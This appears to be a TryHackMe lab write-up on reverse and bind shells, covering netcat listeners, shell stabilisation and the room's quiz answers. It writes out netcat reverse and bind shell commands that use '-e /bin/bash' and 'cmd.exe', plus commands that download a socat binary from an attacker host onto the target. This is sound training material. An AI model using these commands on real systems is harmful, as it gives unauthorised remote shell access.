# What the Shell?

### Task 1: What is a shell?

Before we can get into the intricacies of sending and receiving shells, it's important to understand what a shell actually is. In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common bash or sh programs in Linux are examples of shells, as are cmd.exe and Powershell on Windows. When targeting remote systems it is sometimes possible to force an application running on the server (such as a webserver, for example) to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

We will be covering both of these scenarios in further detail throughout the room.

The format of this room is as follows:

The bulk of the room is made up of information, with examples given in code blocks and screenshots.
There are two VMs – one Linux, one Windows – in the last two tasks of the room. These can be used to practice the techniques demonstrated.
There are example practice questions in Task 13. Feel free to work through these, or follow along with the tasks as you complete them.
Without further ado, let's begin!

### Task 2: Tools

There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell. We will discuss each of these briefly below:

---

**Netcat:**

Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

**Socat:**

Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

The syntax is more difficult
Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.
There are work arounds to both of these problems, which we will cover later on.

Both Socat and Netcat have .exe versions for use on Windows.

**Metasploit – multi/handler:**

The exploit/multi/handler module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, multi/handler provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads – both of which we will look at in task 9.

**Msfvenom:**

Like multi/handler, msfvenom is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.

---

Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md). The PentestMonkey [Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at /usr/share/webshells. The [SecLists repo](https://github.com/danielmiessler/SecLists), though primarily used for wordlists, also contains some very useful code for obtaining shells.

### Task 3: Types of Shell

At a high level, we are interested in two kinds of shell when it comes to exploiting a target: Reverse shells, and bind shells.

- Reverse shells are when the target is forced to execute code that connects back to your computer. On your own computer you would use one of the tools mentioned in the previous task to set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent you from connecting to arbitrary ports on the target; however, the drawback is that, when receiving a shell from a machine across the internet, you would need to configure your own network to accept the shell. This, however, will not be a problem on the TryHackMe network due to the method by which we connect into the network.  
- Bind shells are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning you can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on your own network, but may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug, however, we will cover both examples below. Don't worry too much about the syntax here: we will be looking at it in upcoming tasks. Instead notice the difference between reverse and bind shells in the following simulations.

---

*Reverse Shell example:*

Let's start with the more common reverse shell.

Nine times out of ten, this is what you'll be going for -- especially in CTF challenges like those of TryHackMe.

Take a look at the following image. On the left we have a reverse shell listener -- this is what receives the connection. On the right is a simulation of sending a reverse shell. In reality, this is more likely to be done through code injection on a remote website or something along those lines. Picture the image on the left as being your own computer, and the image on the right as being the target.

On the attacking machine:

sudo nc -lvnp 443

On the target:

_nc <LOCAL-IP> <PORT> -e /bin/bash_

<img width="1051" height="156" alt="image" src="https://github.com/user-attachments/assets/d66e5f66-f5db-404e-83c3-add57451dab6" />

Notice that after running the command on the right, the listener receives a connection. When the whoami command is run, we see that we are executing commands as the target user. The important thing here is that we are listening on our own attacking machine, and sending a connection from the target.

*Bind shell example:*

Bind shells are less common, but still very useful.  

Once again, take a look at the following image. Again, on the left we have the attacker's computer, on the right we have a simulated target. Just to shake things up a little, we'll use a Windows target this time. First, we start a listener on the target -- this time we're also telling it to execute cmd.exe. Then, with the listener up and running, we connect from our own machine to the newly opened port.

On the target:  

_nc -lvnp <port> -e "cmd.exe"_

On the attacking machine:  

_nc MACHINE_IP <port>_

<img width="1327" height="207" alt="image" src="https://github.com/user-attachments/assets/0dc150a7-69fc-4a60-88e5-97a35210457c" />

As you can see, this once again gives us code execution on the remote machine. Note that this is not specific to Windows.  

The important thing to understand here is that we are listening on the target, then connecting to it with our own machine.  

---

The final concept which is relevant in this task is that of interactivity. Shells can be either interactive or non-interactive.

Interactive: If you've used Powershell, Bash, Zsh, sh, or any other standard CLI environment then you will be used to interactive shells. These allow you to interact with programs after executing them. For example, take the SSH login prompt:  
<img width="621" height="82" alt="image" src="https://github.com/user-attachments/assets/f1b13ca0-f04b-483b-b931-cac7c631212e" />

Here you can see that it's asking interactively that the user type either yes or no in order to continue the connection. This is an interactive program, which requires an interactive shell in order to run.


Non-Interactive shells don't give you that luxury. In a non-interactive shell you are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier. Let's see what happens when we try to run SSH in a non-interactive shell:

<img width="492" height="210" alt="image" src="https://github.com/user-attachments/assets/999b4085-ebd0-4672-97da-0d58b6faa693" />

Notice that the whoami command (which is non-interactive) executes perfectly, but the ssh command (which is interactive) gives us no output at all. As an interesting side note, the output of an interactive command does go somewhere, however, figuring out where is an exercise for you to attempt on your own. Suffice to say that interactive programs do not work in non-interactive shells.

Additionally, in various places throughout this task you will see a command in the screenshots called listener. This command is an alias unique to the attacking machine used for demonstrations, and is a shorthand way of typing sudo rlwrap nc -lvnp 443, which will be covered in upcoming tasks. It will not work on any other machine unless the alias has been configured locally.  

### Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?  
*Answer: R*

### You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)  
*Answer: N*

### When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?  
*Answer: T*

### Task 4: Netcat 

As mentioned previously, Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.

_Reverse Shells_

In the previous task we saw that reverse shells require shellcode and a listener. There are many ways to execute a shell, so we'll start by looking at listeners.  

The syntax for starting a netcat listener using Linux is this:  

_nc -lvnp <port-number>_

-l is used to tell netcat that this will be a listener  
-v is used to request a verbose output  
-n tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.  
-p indicates that the port specification will follow.  

The example in the previous task used port 443. Realistically you could use any port you like, as long as there isn't already a service using it. Be aware that if you choose to use a port below 1024, you will need to use sudo when starting your listener. That said, it's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.  

A working example of this would be:  

_sudo nc -lvnp 443_  

We can then connect back to this with any number of payloads, depending on the environment on the target.  

An example of this is displayed in the previous task.  

_Bind Shells_  

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target: all we need to do is connect to it. The syntax for this is relatively straight forward:

_nc <target-ip> <chosen-port>_

Here we are using netcat to make an outbound connection to the target on our chosen port.

We will look at using netcat to create a listener for this type of shell in Task 8. What's important here is that you understand how to connect to a listening port using netcat.

### Which option tells netcat to listen?  
*Answer: -l*

### How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?  
*Answer: nc 10.10.10.11 8080*

### Task 5: Netcat Shell Stabilization

Ok, so we've caught or connected to a netcat shell, what next?

These shells are very unstable by default. Pressing Ctrl + C kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right. Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder; however, the second technique that we'll be covering here is particularly useful for it.

---

_Technique 1: Python_

 The first technique we'll be discussing is applicable only to Linux boxes, as they will nearly always have Python installed by default. This is a three stage process:  

1. The first thing to do is use python -c 'import pty;pty.spawn("/bin/bash")', which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace python with python2 or python3 as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: export TERM=xterm -- this will give us access to term commands such as clear.
3. Finally (and most importantly) we will background the shell using Ctrl + Z. Back in our own terminal we use stty raw -echo; fg. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process.  

The full technique can be seen here:

<img width="664" height="385" alt="image" src="https://github.com/user-attachments/assets/7ae7b33b-7d23-43cc-8306-5092d10aa344" />

Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.

---

_Technique 2: rlwrap_

rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilisation must still be utilised if you want to be able to use Ctrl + C inside the shell. rlwrap is not installed by default on Kali, so first install it with sudo apt install rlwrap.  

To use rlwrap, we invoke a slightly different listener:  

rlwrap nc -lvnp <port>  

Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with Ctrl + Z, then use stty raw -echo; fg to stabilise and re-enter the shell.

---

_Technique 3: Socat_  

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary(opens in new tab) (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary (sudo python3 -m http.server 80), then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget (wget <LOCAL-IP>/socat -O /tmp/socat).  

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed (Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe). We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks.

---

With any of the above techniques, it's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.  

First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:

<img width="995" height="65" alt="image" src="https://github.com/user-attachments/assets/6f017e75-7b99-4e03-8d02-c97659f2906d" />

Next, in your reverse/bind shell, type in:  

stty rows <number>  

and  

stty cols <number>  

Filling in the numbers you got from running the command in your own terminal.  

This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.  

### How would you change your terminal size to have 238 columns?
*stty cols 238*

### What is the syntax for setting up a Python3 webserver on port 80? 
*sudo python3 -m http.server 80*
